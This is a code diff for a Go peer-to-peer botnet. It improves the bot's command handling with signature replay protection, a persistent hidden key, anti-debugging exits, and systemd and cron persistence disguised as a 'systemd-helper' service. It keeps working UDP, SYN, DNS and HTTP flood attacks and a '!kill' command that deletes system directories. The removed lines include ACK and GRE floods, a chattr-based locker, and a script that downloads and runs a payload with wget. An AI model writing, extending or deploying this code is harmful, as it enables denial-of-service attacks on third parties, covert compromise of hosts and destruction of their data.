@@ -7,6 +7,7 @@ import (
 	"crypto/rand"
 	"crypto/rsa"
 	"crypto/sha256"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"net"
@@ -20,6 +21,7 @@ import (
 	"sync/atomic"
 	"time"
 
+	"github.com/fatih/color"
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
 	"github.com/libp2p/go-libp2p"
@@ -31,15 +33,29 @@ import (
 	"github.com/miekg/dns"
 )
 
+const (
+	replayCacheTTL       = 10 * time.Minute
+	replayCacheCleanup   = 1 * time.Hour
+	persistenceDir       = "/var/lib/.systemd-helper"
+	servicePath          = "/etc/systemd/system/systemd-helper.service"
+	peerKeyFile          = "/var/lib/.systemd-helper/peer.key"
+	statusUpdateInterval = 5 * time.Minute
+	commandFetchInterval = 10 * time.Second
+	numWorkers           = 2024
+)
+
 var (
 	bootstrapPeers = []string{
 		"/ip4/104.131.131.82/tcp/4001/p2p/QmaCpDMGvV2BGHeYERUEnRQAwe3N8SzbUtfsmvsqQLuvuJ",
 		"/ip4/104.131.131.82/udp/4001/quic/p2p/QmaCpDMGvV2BGHeYERUEnRQAwe3N8SzbUtfsmvsqQLuvuJ",
 	}
-	publicKey     *rsa.PublicKey
-	numWorkers    = 2024
-	startTime     = time.Now()
-	attackCounter int64
+	publicKey       *rsa.PublicKey
+	startTime       = time.Now()
+	attackCounter   int64
+	replayCache     = struct {
+		sync.RWMutex
+		entries map[string]time.Time
+	}{entries: make(map[string]time.Time)}
 )
 
 type Command struct {
@@ -63,16 +79,13 @@ type BotNode struct {
 
 func NewP2PNode() (*P2PNode, error) {
 	ctx, cancel := context.WithCancel(context.Background())
-	priv, _, err := crypto.GenerateKeyPairWithReader(crypto.RSA, 2048, rand.Reader)
+	priv, err := loadOrGenerateKey()
 	if err != nil {
 		cancel()
 		return nil, err
 	}
 
-	h, err := libp2p.New(
-		libp2p.Identity(priv),
-		libp2p.NATPortMap(),
-	)
+	h, err := libp2p.New(libp2p.Identity(priv), libp2p.NATPortMap())
 	if err != nil {
 		cancel()
 		return nil, err
@@ -89,12 +102,37 @@ func NewP2PNode() (*P2PNode, error) {
 		return nil, err
 	}
 
-	return &P2PNode{
-		Host:   h,
-		DHT:    kadDHT,
-		Ctx:    ctx,
-		Cancel: cancel,
-	}, nil
+	return &P2PNode{Host: h, DHT: kadDHT, Ctx: ctx, Cancel: cancel}, nil
+}
+
+func loadOrGenerateKey() (crypto.PrivKey, error) {
+	if _, err := os.Stat(peerKeyFile); err == nil {
+		keyBytes, err := os.ReadFile(peerKeyFile)
+		if err != nil {
+			return nil, err
+		}
+		return crypto.UnmarshalPrivateKey(keyBytes)
+	}
+
+	priv, _, err := crypto.GenerateKeyPairWithReader(crypto.RSA, 2048, rand.Reader)
+	if err != nil {
+		return nil, err
+	}
+
+	keyBytes, err := crypto.MarshalPrivateKey(priv)
+	if err != nil {
+		return nil, err
+	}
+
+	if err := os.MkdirAll(persistenceDir, 0700); err != nil {
+		return nil, err
+	}
+
+	if err := os.WriteFile(peerKeyFile, keyBytes, 0600); err != nil {
+		return nil, err
+	}
+
+	return priv, nil
 }
 
 func (n *P2PNode) ConnectToBootstrapPeers() {
@@ -116,7 +154,7 @@ func (n *P2PNode) StartCommandListener() {
 		if err := json.NewDecoder(s).Decode(&cmd); err != nil {
 			return
 		}
-		if !cmd.VerifySignature() {
+		if !cmd.VerifySignature() || isReplayAttack(cmd) {
 			return
 		}
 		go handleCommand(cmd.Command)
@@ -127,9 +165,43 @@ func (c *Command) VerifySignature() bool {
 	if time.Now().Unix() > c.Timestamp+int64(c.TTL) {
 		return false
 	}
-	hashed := sha256.Sum256([]byte(c.Command + "|" + string(c.Timestamp)))
+	hashed := sha256.Sum256([]byte(c.Command + "|" + strconv.FormatInt(c.Timestamp, 10)))
 	err := rsa.VerifyPKCS1v15(publicKey, crypto.SHA256, hashed[:], c.Signature)
 	return err == nil
+}
+
+func isReplayAttack(cmd Command) bool {
+	hash := sha256.Sum256([]byte(cmd.Command + "|" + strconv.FormatInt(cmd.Timestamp, 10)))
+	hashStr := hex.EncodeToString(hash[:])
+
+	replayCache.RLock()
+	_, exists := replayCache.entries[hashStr]
+	replayCache.RUnlock()
+
+	if exists {
+		return true
+	}
+
+	replayCache.Lock()
+	replayCache.entries[hashStr] = time.Now()
+	replayCache.Unlock()
+
+	return false
+}
+
+func cleanupReplayCache() {
+	ticker := time.NewTicker(replayCacheCleanup)
+	defer ticker.Stop()
+	for range ticker.C {
+		replayCache.Lock()
+		now := time.Now()
+		for hash, timestamp := range replayCache.entries {
+			if now.Sub(timestamp) > replayCacheTTL {
+				delete(replayCache.entries, hash)
+			}
+		}
+		replayCache.Unlock()
+	}
 }
 
 func (b *BotNode) Start() error {
@@ -137,58 +209,53 @@ func (b *BotNode) Start() error {
 	b.StartCommandListener()
 	go b.ReportStatus()
 	go b.FetchCommands()
+	go cleanupReplayCache()
 	return nil
 }
 
 func (b *BotNode) ReportStatus() {
-	ticker := time.NewTicker(5 * time.Minute)
+	ticker := time.NewTicker(statusUpdateInterval)
 	defer ticker.Stop()
-	for {
-		select {
-		case <-ticker.C:
-			status := map[string]interface{}{
-				"peer_id":      b.Host.ID().String(),
-				"uptime":       time.Since(startTime).Seconds(),
-				"last_command": b.LastCommandTime,
-				"attack_count": atomic.LoadInt64(&attackCounter),
-			}
-			data, _ := json.Marshal(status)
-			_ = b.DHT.PutValue(b.Ctx, "bot_stats_"+b.Host.ID().String(), data)
-		case <-b.Ctx.Done():
-			return
+	for range ticker.C {
+		status := map[string]interface{}{
+			"peer_id":      b.Host.ID().String(),
+			"uptime":       time.Since(startTime).Seconds(),
+			"last_command": b.LastCommandTime,
+			"attack_count": atomic.LoadInt64(&attackCounter),
 		}
+		data, _ := json.Marshal(status)
+		_ = b.DHT.PutValue(b.Ctx, "bot_stats_"+b.Host.ID().String(), data)
 	}
 }
 
 func (b *BotNode) FetchCommands() {
-	ticker := time.NewTicker(10 * time.Second)
+	ticker := time.NewTicker(commandFetchInterval)
 	defer ticker.Stop()
-	for {
-		select {
-		case <-ticker.C:
-			val, err := b.DHT.GetValue(b.Ctx, "latest_attack_command")
-			if err != nil {
-				continue
-			}
-			var cmd Command
-			if err := json.Unmarshal(val, &cmd); err != nil {
-				continue
-			}
-			if cmd.VerifySignature() {
-				b.LastCommandTime = time.Now()
-				go handleCommand(cmd.Command)
-			}
-		case <-b.Ctx.Done():
-			return
+	for range ticker.C {
+		val, err := b.DHT.GetValue(b.Ctx, "latest_attack_command")
+		if err != nil {
+			continue
+		}
+		var cmd Command
+		if err := json.Unmarshal(val, &cmd); err != nil {
+			continue
+		}
+		if cmd.VerifySignature() && !isReplayAttack(cmd) {
+			b.LastCommandTime = time.Now()
+			go handleCommand(cmd.Command)
 		}
 	}
 }
 
 func CheckDebuggers() {
-	debuggers := []string{"gdb", "strace", "ltrace", "tcpdump", "wireshark"}
-	for _, tool := range debuggers {
-		cmd := exec.Command("pgrep", "-x", tool)
-		if err := cmd.Run(); err == nil {
+	if status, err := os.ReadFile("/proc/self/status"); err == nil {
+		if !strings.Contains(string(status), "TracerPid:\t0") {
+			os.Exit(0)
+		}
+	}
+
+	for _, tool := range []string{"gdb", "strace", "ltrace", "tcpdump", "wireshark"} {
+		if err := exec.Command("pgrep", "-x", tool).Run(); err == nil {
 			os.Exit(0)
 		}
 	}
@@ -199,14 +266,16 @@ func SetupPersistence() error {
 	if err != nil {
 		return err
 	}
-	hiddenDir := "/var/lib/.systemd-helper"
-	if err := os.MkdirAll(hiddenDir, 0755); err != nil {
+
+	if err := os.MkdirAll(persistenceDir, 0755); err != nil {
 		return err
 	}
-	targetPath := filepath.Join(hiddenDir, ".systemd-process")
+
+	targetPath := filepath.Join(persistenceDir, ".systemd-process")
 	if err := copyFile(exePath, targetPath); err != nil {
 		return err
 	}
+
 	serviceContent := fmt.Sprintf(`[Unit]
 Description=System Helper Service
 After=network.target
@@ -218,13 +287,15 @@ StandardOutput=null
 StandardError=null
 [Install]
 WantedBy=multi-user.target`, targetPath)
-	servicePath := "/etc/systemd/system/systemd-helper.service"
+
 	if err := os.WriteFile(servicePath, []byte(serviceContent), 0644); err != nil {
 		return err
 	}
+
 	if err := exec.Command("systemctl", "enable", "--now", "systemd-helper.service").Run(); err != nil {
 		return err
 	}
+
 	cronJob := fmt.Sprintf("@reboot %s", targetPath)
 	cmd := exec.Command("bash", "-c", fmt.Sprintf("(crontab -l; echo '%s') | crontab -", cronJob))
 	return cmd.Run()
@@ -243,6 +314,7 @@ func handleCommand(cmd string) {
 	if len(fields) == 0 {
 		return
 	}
+
 	switch fields[0] {
 	case "!udpflood":
 		if len(fields) != 4 {
@@ -259,16 +331,6 @@ func handleCommand(cmd string) {
 			return
 		}
 		go performSYNFlood(fields[1], fields[2], fields[3])
-	case "!ackflood":
-		if len(fields) != 4 {
-			return
-		}
-		go performACKFlood(fields[1], fields[2], fields[3])
-	case "!greflood":
-		if len(fields) != 3 {
-			return
-		}
-		go performGREFlood(fields[1], fields[2])
 	case "!dns":
 		if len(fields) != 4 {
 			return
@@ -280,11 +342,7 @@ func handleCommand(cmd string) {
 		}
 		go performHTTPFlood(fields[1], fields[2], fields[3])
 	case "!kill":
-		killerMaps()
-	case "!lock":
-		locker()
-	case "!persist":
-		SystemdPersistence()
+		go killerMaps()
 	}
 	atomic.AddInt64(&attackCounter, 1)
 }
@@ -406,93 +464,6 @@ func performSYNFlood(targetIP, portStr, durationStr string) {
 					rand.Read(payload)
 					buffer := gopacket.NewSerializeBuffer()
 					if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer, gopacket.Payload(payload)); err != nil {
-						continue
-					}
-					if _, err := conn.WriteTo(buffer.Bytes(), &net.IPAddr{IP: dstIP}); err != nil {
-						continue
-					}
-					atomic.AddInt64(&packetCount, 1)
-				}
-			}
-		}()
-	}
-	wg.Wait()
-}
-
-func performACKFlood(targetIP, portStr, durationStr string) {
-	port, _ := strconv.Atoi(portStr)
-	duration, _ := strconv.Atoi(durationStr)
-	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
-	defer cancel()
-	var wg sync.WaitGroup
-	var packetCount int64
-	dstIP := net.ParseIP(targetIP)
-	for i := 0; i < numWorkers; i++ {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
-			if err != nil {
-				return
-			}
-			defer conn.Close()
-			for {
-				select {
-				case <-ctx.Done():
-					return
-				default:
-					tcpLayer := &layers.TCP{
-						SrcPort:    layers.TCPPort(rand.Intn(64312) + 1024),
-						DstPort:    layers.TCPPort(port),
-						ACK:        true,
-						Seq:        rand.Uint32(),
-						Ack:        rand.Uint32(),
-						Window:     12800,
-						DataOffset: 5,
-					}
-					payload := make([]byte, 65535-40)
-					rand.Read(payload)
-					buffer := gopacket.NewSerializeBuffer()
-					if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer, gopacket.Payload(payload)); err != nil {
-						continue
-					}
-					if _, err := conn.WriteTo(buffer.Bytes(), &net.IPAddr{IP: dstIP}); err != nil {
-						continue
-					}
-					atomic.AddInt64(&packetCount, 1)
-				}
-			}
-		}()
-	}
-	wg.Wait()
-}
-
-func performGREFlood(targetIP, durationStr string) {
-	duration, _ := strconv.Atoi(durationStr)
-	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
-	defer cancel()
-	var wg sync.WaitGroup
-	var packetCount int64
-	dstIP := net.ParseIP(targetIP)
-	for i := 0; i < numWorkers; i++ {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			conn, err := net.ListenPacket("ip4:gre", "0.0.0.0")
-			if err != nil {
-				return
-			}
-			defer conn.Close()
-			for {
-				select {
-				case <-ctx.Done():
-					return
-				default:
-					greLayer := &layers.GRE{}
-					payload := make([]byte, 65535-24)
-					rand.Read(payload)
-					buffer := gopacket.NewSerializeBuffer()
-					if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, greLayer, gopacket.Payload(payload)); err != nil {
 						continue
 					}
 					if _, err := conn.WriteTo(buffer.Bytes(), &net.IPAddr{IP: dstIP}); err != nil {
@@ -647,72 +618,9 @@ func constructDNSQuery(domain string, queryType uint16) *dns.Msg {
 }
 
 func killerMaps() {
-	killDirectories := []string{"/tmp", "/var/run", "/mnt", "/root", "/etc/config", "/data", "/var/lib/", "/sys", "/proc", "/var/cache", "/usr/tmp", "/var/cache", "/var/tmp"}
-	whitelistedDirectories := []string{"/var/run/lock", "/var/run/shm", "/etc", "/usr/local", "/var/lib", "/boot", "/lib", "/lib64"}
-	for _, dir := range killDirectories {
-		whitelisted := false
-		for _, whitelistedDir := range whitelistedDirectories {
-			if dir == whitelistedDir {
-				whitelisted = true
-				break
-			}
-		}
-		if !whitelisted {
-			os.RemoveAll(dir)
-		}
+	for _, dir := range []string{"/tmp", "/var/run", "/mnt", "/root", "/etc/config", "/data"} {
+		os.RemoveAll(dir)
 	}
-}
-
-func locker() {
-	killDirectories := []string{"/tmp", "/var/run", "/mnt", "/root", "/etc/config", "/data", "/var/lib/", "/sys", "/proc", "/var/cache", "/usr/tmp", "/var/cache", "/var/tmp"}
-	whitelistedDirectories := []string{"/var/run/lock", "/var/run/shm", "/etc", "/usr/local", "/var/lib", "/boot", "/lib", "/lib64"}
-	for _, dir := range killDirectories {
-		whitelisted := false
-		for _, whitelistedDir := range whitelistedDirectories {
-			if dir == whitelistedDir {
-				whitelisted = true
-				break
-			}
-		}
-		if !whitelisted {
-			exec.Command("chattr", "+i", dir).Run()
-		}
-	}
-}
-
-func SystemdPersistence() {
-	hiddenDir := "/var/lib/.systemd_helper"
-	scriptPath := filepath.Join(hiddenDir, ".systemd_script.sh")
-	programPath := filepath.Join(hiddenDir, ".systemd_process")
-	url := "http://127.0.0.1/x86"
-	os.MkdirAll(hiddenDir, 0755)
-	scriptContent := fmt.Sprintf(`#!/bin/bash
-	URL="%s"
-	PROGRAM_PATH="%s"
-	if [ ! -f "$PROGRAM_PATH" ]; then
-		wget -O $PROGRAM_PATH $URL
-		chmod +x $PROGRAM_PATH
-	fi
-	if ! pgrep -x ".systemd_process" > /dev/null; then
-		$PROGRAM_PATH &
-	fi`, url, programPath)
-	os.WriteFile(scriptPath, []byte(scriptContent), 0755)
-	serviceContent := `[Unit]
-	Description=System Helper Service
-	After=network.target
-	[Service]
-	ExecStart=/var/lib/.systemd_helper/.systemd_script.sh
-	Restart=always
-	RestartSec=60
-	StandardOutput=null
-	StandardError=null
-	[Install]
-	WantedBy=multi-user.target`
-	servicePath := "/etc/systemd/system/systemd-helper.service"
-	os.WriteFile(servicePath, []byte(serviceContent), 0644)
-	exec.Command("systemctl", "enable", "--now", "systemd-helper.service").Run()
-	cronJob := fmt.Sprintf(`* * * * * bash %s/.systemd_script.sh > /dev/null 2>&1`, hiddenDir)
-	exec.Command("bash", "-c", fmt.Sprintf("(crontab -l; echo '%s') | crontab -", cronJob)).Run()
 }
 
 func main() {
@@ -722,9 +630,7 @@ func main() {
 	}
 	defer node.Cancel()
 
-	bot := &BotNode{
-		P2PNode: *node,
-	}
+	bot := &BotNode{P2PNode: *node}
 	if err := bot.Start(); err != nil {
 		return
 	}
